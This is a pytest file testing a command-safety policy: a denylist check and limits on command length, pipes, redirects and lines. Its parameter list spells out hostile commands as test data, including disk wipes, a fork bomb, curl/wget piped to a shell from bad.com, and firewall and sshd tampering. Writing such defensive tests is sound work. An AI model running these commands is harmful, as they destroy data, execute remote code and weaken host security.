# tests/policy/test_safety.py
import pytest
from security_app.policy.safety import deny_reason, check_cmd_length, assert_cmd_length_safe, CmdLimits, SafetyError
from security_app import settings # Used to get default limits if needed

# --- Test deny_reason ---

@pytest.mark.parametrize("cmd, should_deny", [
    # Destructive/System altering
    ("rm -rf /", True),
    ("rm -fr / path", True),
    ("dd if=/dev/zero of=/dev/sda", True),
    ("mkfs.ext4 /dev/sdb1", True),
    ("fdisk /dev/sda", True),
    ("> /etc/passwd", True),
    (":(){ :|:& };:", True), # Fork bomb
    ("shutdown now", True),
    ("reboot", True),
    ("init 0", True),
    ("systemctl stop sshd", True),
    ("systemctl mask ufw", True),
    ("apt install malicious-package", True),
    ("apt-get remove important-package", True),
    ("dpkg -i /tmp/package.deb", True),
    ("curl http://bad.com/script | sh", True), # Pipe to sh
    ("wget -O - http://bad.com/script | bash", True), # Pipe to bash
    ("echo 'code' | base64 -d | python", True), # Pipe decoded to python
    ("iptables --flush", True),
    ("chmod 777 /etc/shadow", True),
    ("mount /dev/sdb1 /etc", True), # Mount over sensitive dir

    # Safe commands
    ("ls -l /", False),
    ("grep 'pattern' /etc/hosts", False),
    ("echo 'safe string'", False),
    ("cat /proc/version", False),
    ("systemctl status nginx", False),
    ("apt list --installed", False),
    ("df -h", False),
    ("mount", False), # Just listing mounts is safe
    ("chmod 600 file.txt", False), # Chmod on relative path is ok by default denylist
    ("curl http://example.com", False), # Simple curl/wget is ok
    ("echo test", False),
])
def test_deny_reason(cmd, should_deny):
    """Tests various commands against the deny list regexes."""
    reason = deny_reason(cmd)
    if should_deny:
        assert reason is not None, f"Command '{cmd}' should be denied but was not."
        assert "DENIED" in reason
    else:
        assert reason is None, f"Command '{cmd}' should NOT be denied but was, reason: {reason}"

def test_deny_reason_empty_or_none():
    """Tests deny_reason with empty or None input."""
    assert "empty command" in (deny_reason("") or "")
    assert "empty command" in (deny_reason(None) or "")

# --- Test check_cmd_length / assert_cmd_length_safe ---

# Use default limits for most tests, override when needed
default_limits = CmdLimits()

def test_check_cmd_length_ok():
    """Tests a command that meets default complexity limits."""
    ok, reason, _ = check_cmd_length("ls -l /home | grep user")
    assert ok is True
    assert reason == "ok"

def test_check_cmd_length_too_long_chars():
    """Tests error when command exceeds max characters."""
    limits = CmdLimits(max_chars=10)
    cmd = "this command is way too long"
    ok, reason, metrics = check_cmd_length(cmd, limits)
    assert ok is False
    assert "chars" in reason and str(limits.max_chars) in reason and str(metrics.chars) in reason

def test_check_cmd_length_too_many_args():
    """Tests error when command exceeds max arguments."""
    limits = CmdLimits(max_args=3)
    # Note: shlex.split handles quotes correctly
    cmd = "cmd arg1 'arg 2 with space' arg3 arg4"
    ok, reason, metrics = check_cmd_length(cmd, limits)
    assert ok is False
    assert "argc" in reason and str(limits.max_args) in reason and str(metrics.argc) in reason # argc should be 5 here

def test_check_cmd_length_too_many_pipes():
    """Tests error when command exceeds max pipes."""
    limits = CmdLimits(max_pipes=1)
    cmd = "cmd1 | cmd2 | cmd3" # 2 pipes
    ok, reason, metrics = check_cmd_length(cmd, limits)
    assert ok is False
    assert "pipes" in reason and str(limits.max_pipes) in reason and str(metrics.pipes) in reason

def test_check_cmd_length_too_many_redirects():
    """Tests error when command exceeds max redirects."""
    limits = CmdLimits(max_redirects=2)
    cmd = "cmd > file1 2> file2 < input.txt" # 3 redirects
    ok, reason, metrics = check_cmd_length(cmd, limits)
    assert ok is False
    assert "redirects" in reason and str(limits.max_redirects) in reason and str(metrics.redirects) in reason

def test_check_cmd_length_too_many_lines():
    """Tests error when command exceeds max lines."""
    limits = CmdLimits(max_lines=2)
    cmd = "echo line1\necho line2\necho line3" # 3 lines
    ok, reason, metrics = check_cmd_length(cmd, limits)
    assert ok is False
    assert "lines" in reason and str(limits.max_lines) in reason and str(metrics.lines) in reason

def test_check_cmd_length_line_too_long():
    """Tests error when a line exceeds max line characters."""
    limits = CmdLimits(max_line_chars=20)
    cmd = "echo short\necho this line is definitely longer than twenty characters"
    ok, reason, metrics = check_cmd_length(cmd, limits)
    assert ok is False
    assert "line_len" in reason and str(limits.max_line_chars) in reason and str(metrics.max_line_len) in reason

def test_assert_cmd_length_safe_raises_on_violation():
    """Tests that assert_cmd_length_safe raises SafetyError on violation."""
    limits = CmdLimits(max_chars=5)
    # FIX: Update the expected character count in the match regex
    with pytest.raises(SafetyError, match=r"too-long/complex: chars 16>5"):
        assert_cmd_length_safe("this is too long", limits) # "this is too long" has 16 chars

def test_assert_cmd_length_safe_ok_on_valid():
    """Tests that assert_cmd_length_safe passes for a valid command."""
    try:
        metrics = assert_cmd_length_safe("valid command", CmdLimits(max_chars=100))
        assert metrics.chars == len("valid command") # Check if metrics are returned
    except SafetyError:
        pytest.fail("assert_cmd_length_safe raised SafetyError unexpectedly")